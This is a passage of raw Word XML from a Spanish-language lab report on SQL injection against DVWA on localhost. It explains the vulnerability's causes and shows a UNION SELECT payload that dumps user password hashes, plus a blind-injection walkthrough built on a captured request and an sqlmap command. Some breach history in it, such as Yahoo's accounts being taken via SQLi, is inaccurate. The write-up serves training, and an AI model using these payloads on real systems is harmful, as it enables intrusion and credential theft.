              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Los datos se extraen por un canal diferente al HTTP (DNS, SMB). Usado cuando in-band y blind no funcionan.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FFC58E6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Tráfico DNS/SMB hacia el servidor del atacante</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45CCDDF2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="5F6B6EFE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Impacto histórico de SQL Injection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378DFD8F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Yahoo (2012): 3 billones de cuentas comprometidas vía SQLi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D453761" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Sony Pictures (2011): exfiltración masiva de datos mediante inyección SQL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436A7BAD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>RockYou (2009): 32 millones de contraseñas en texto plano expuestas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671763DA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Heartland Payment Systems (2008): 130 millones de tarjetas de crédito robadas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4CF991" w14:textId="5BCEAD1B" w:rsidR="00AE5F76" w:rsidRDefault="00CC453F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Descripción de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670EF535" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El módulo SQL Injection de DVWA permite buscar usuarios por ID. El valor del parámetro id se concatena directamente en la query SQL sin sanitización. Una comilla simple en el input cierra la cadena de la query, permitiendo al atacante inyectar SQL arbitrario: filtrar registros, unir tablas mediante UNION SELECT, leer la base de datos completa o modificar/eliminar datos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E1E1AC" w14:textId="44D23AC2" w:rsidR="00AE5F76" w:rsidRDefault="00CC453F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>8.3</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Causas de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9B6125" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a. Ausencia de validaciones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAB3278" w14:textId="50251039" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>No se usa mysql_real_escape_string(), PDO con prepared statements ni ninguna función de parametrización. El input se incluye directamente en la query como cadena.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BBE090" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b. Errores de lógica</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA2CC47" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La aplicación construye la query dinámicamente concatenando strings. Este patrón es intrínsecamente inseguro porque no separa código (SQL) de datos (input). La solución arquitectónica es usar consultas preparadas, donde el motor SQL recibe la estructura de la query y los datos por separado.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6283A312" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="6F13DD3A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>c. Manejo inadecuado de entradas y salidas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681AE54A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Los mensajes de error de MySQL son visibles al usuario (nivel Low), revelando estructura de tablas y tipos de datos. La función mysql_query() está deprecada desde PHP 5.5. El tipo del parámetro id no se valida (debería ser entero).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADB4563" w14:textId="07546C9E" w:rsidR="00AE5F76" w:rsidRDefault="00CC453F">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.1.4 y 8.1.5 </w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Mecanismo de ataque — SQL Injection Manual</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7901CA51" w14:textId="3601FF30" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Objetivo: extraer todos los usuarios y contraseñas de la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A7B1F4" w14:textId="3690D21C" w:rsidR="00514FF5" w:rsidRDefault="00514FF5">
      <w:r>
        <w:t>Para obtener los usuarios y contraseñas, Podemos utilizar el siguiente payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD94D51" w14:textId="54E9F920" w:rsidR="00514FF5" w:rsidRDefault="00514FF5">
      <w:r w:rsidRPr="00514FF5">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00514FF5">
        <w:t>\\' UNION SELECT user,password FROM users-- -</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AF1A68" w14:textId="77777777" w:rsidR="00514FF5" w:rsidRDefault="00514FF5">
      <w:r>
        <w:t>Donde:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700A8FF0" w14:textId="77777777" w:rsidR="00514FF5" w:rsidRDefault="00514FF5">
      <w:r w:rsidRPr="00514FF5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00514FF5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Es el valor normal que espera el formulario </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F07190B" w14:textId="1D913B1D" w:rsidR="00514FF5" w:rsidRDefault="00514FF5">
      <w:r w:rsidRPr="00514FF5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> \\' UNION SELECT user,password FROM users-- -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Es el SQL malicioso, que pretende unir la consulta norma</w:t>
      </w:r>
      <w:r w:rsidR="005631F1">
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, con </w:t>
      </w:r>
      <w:r w:rsidR="005631F1">
        <w:t>la maliciosa, que solicita misma cantidad de columnas, pero solicitando usuarios y password. Finalmente de la imagen 8.1.1 podemos analizar lo siguiente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67957A2F" w14:textId="41B3AA15" w:rsidR="005631F1" w:rsidRDefault="005631F1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58B14F59" wp14:editId="22701A74">
            <wp:extent cx="5168766" cy="248208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1778" cy="2483531"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D48E3F" w14:textId="4C49C54A" w:rsidR="005631F1" w:rsidRDefault="005631F1">
      <w:r w:rsidRPr="005631F1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Imagen 8.1.1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Respuesta de DVWA ante el SQL Inyection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4A2825" w14:textId="23E82F7A" w:rsidR="005631F1" w:rsidRDefault="005631F1">
      <w:r>
        <w:t xml:space="preserve">La respuesta de la base de datos, muestra los diferentes usuarios y sus contraseñas. Las cuales están con hash MD5. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8813BC" w14:textId="77777777" w:rsidR="005631F1" w:rsidRDefault="005631F1" w:rsidP="005631F1">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:lang w:val="es-CO" w:eastAsia="es-CO"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>¿Qué es un hash MD5?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269E3C6" w14:textId="77777777" w:rsidR="005631F1" w:rsidRDefault="005631F1" w:rsidP="005631F1">
      <w:pPr>
        <w:pStyle w:val="font-claude-response-body"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">MD5 es una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>función de hash criptográfico</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — toma cualquier texto y produce una cadena fija de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>32 caracteres hexadecimales</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC5CB89" w14:textId="77777777" w:rsidR="005631F1" w:rsidRPr="00514FF5" w:rsidRDefault="005631F1"/>
    <w:p w14:paraId="4009C79A" w14:textId="656F6C0D" w:rsidR="005631F1" w:rsidRDefault="005631F1" w:rsidP="005631F1">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>8.2.4 y 8</w:t>
      </w:r>
      <w:r w:rsidR="00C64930">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F40DF6">
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.5 . Mecanismo de ataque — SQL Injection </w:t>
      </w:r>
      <w:r w:rsidR="00F40DF6">
        <w:t>(BLIND)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A1BCC0" w14:textId="7EF6B652" w:rsidR="00F40DF6" w:rsidRDefault="00C64930" w:rsidP="00F40DF6">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>QL Injection Blind</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a diferencia del SQL Injection normal,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C64930">
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>no muestra directamente los resultados de la consulta SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. En vez de ver datos de la base de datos, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>solo ves si la consulta fue verdadera o falsa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Con eso </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Podemos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>deduc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t>ir</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Textoennegrita"/>
        </w:rPr>
        <w:t xml:space="preserve"> la información poco a poco</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BD6717" w14:textId="5228CE92" w:rsidR="00C64930" w:rsidRDefault="00C64930" w:rsidP="00F40DF6"/>
    <w:p w14:paraId="0289A27E" w14:textId="3FFE6BCB" w:rsidR="00C64930" w:rsidRDefault="00C64930" w:rsidP="00F40DF6">
      <w:r>
        <w:t xml:space="preserve">Dicho esto, Podemos deducir hipotesis con dos posibles payload. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3618D6BA" w14:textId="7DDEA8AF" w:rsidR="00C64930" w:rsidRDefault="00C64930" w:rsidP="00C64930">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Envia entrada, si retorna true o false, deducimos que la entrada sirve o no para vulnerary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7A17ED" w14:textId="39E066FB" w:rsidR="00C64930" w:rsidRDefault="00C64930" w:rsidP="00C64930">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Enviar sleeps, y si la pagina toma los sleeps, es porque la entrada que venia acompañada de los sleeps si hace presencia en la base de datos que intentamos vulnerary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DB6FE4" w14:textId="2D606D53" w:rsidR="00C64930" w:rsidRDefault="00C64930" w:rsidP="00C64930">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="674EC76A" w14:textId="6A004003" w:rsidR="00C64930" w:rsidRPr="00923836" w:rsidRDefault="00FF719C" w:rsidP="00C64930">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Paso 1- Obtener cookie </w:t>
      </w:r>
      <w:r w:rsidRPr="00923836">
        <w:t>1fe5ff5d0b095f10a37b8f7e4bfbbf8e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A490AD" w14:textId="6BADF116" w:rsidR="00FF719C" w:rsidRPr="00923836" w:rsidRDefault="00FF719C" w:rsidP="00C64930">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00923836">
        <w:t>Paso 2 – listar bases de datos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74747798" w14:textId="3AFF2D14" w:rsidR="002C7998" w:rsidRPr="00923836" w:rsidRDefault="00923836" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00923836">
        <w:t xml:space="preserve"> En la terminal ejecutamos el siguiente </w:t>
      </w:r>
      <w:r w:rsidR="002C7998">
        <w:t>commando</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2FECE2" w14:textId="77777777" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>cat &gt; /home/kali/dvwa_blind.txt &lt;&lt; 'EOF'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9F7835" w14:textId="77777777" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>GET /DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D38EDA" w14:textId="77777777" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>Host: 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761C15F0" w14:textId="77777777" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>Cookie: security=low; PHPSESSID=1fe5ff5d0b095f10a37b8f7e4bfbbf8e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDE4B86" w14:textId="1DF7803C" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>Connection: close</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1B7A8A" w14:textId="6A712357" w:rsidR="00923836" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>EOF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2657D496" w14:textId="159E7244" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Courier New" w:cstheme="minorBidi"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Paso 3 – luego de obtener en un archivo txt, identiicamos las bases de datos con el </w:t>
      </w:r>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Courier New" w:cstheme="minorBidi"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>siguiente comando</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC1C186" w14:textId="720DE27C" w:rsidR="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Courier New" w:cstheme="minorBidi"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Courier New" w:cstheme="minorBidi"/>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sqlmap -r /home/kali/dvwa_blind.txt --dbs --batch --level=3 --risk=2 --fresh-queries</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B6AC41" w14:textId="0FFB012C" w:rsidR="002C7998" w:rsidRPr="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B68BA5F" w14:textId="350FBC74" w:rsidR="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C7998">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Y f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>inalmente desde la terminal luego del commando del paso 3 nos trae el nombre de as bases de datos imagen 8.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BD868F" w14:textId="2E0AE43B" w:rsidR="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75A1F0F7" wp14:editId="55EADC1B">
            <wp:extent cx="5486400" cy="263461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634615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E27EE7" w14:textId="089BD361" w:rsidR="002C7998" w:rsidRDefault="002C7998" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Imagen 8.2.1 bases de datos en sql inyection blind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47034657" w14:textId="6CECCF99" w:rsidR="003B42D8" w:rsidRDefault="003B42D8" w:rsidP="002C7998">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Que al final son:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2DC26D" w14:textId="77777777" w:rsidR="003B42D8" w:rsidRPr="003B42D8" w:rsidRDefault="003B42D8" w:rsidP="003B42D8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B42D8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>available databases [2]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C889B34" w14:textId="77777777" w:rsidR="003B42D8" w:rsidRPr="003B42D8" w:rsidRDefault="003B42D8" w:rsidP="003B42D8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
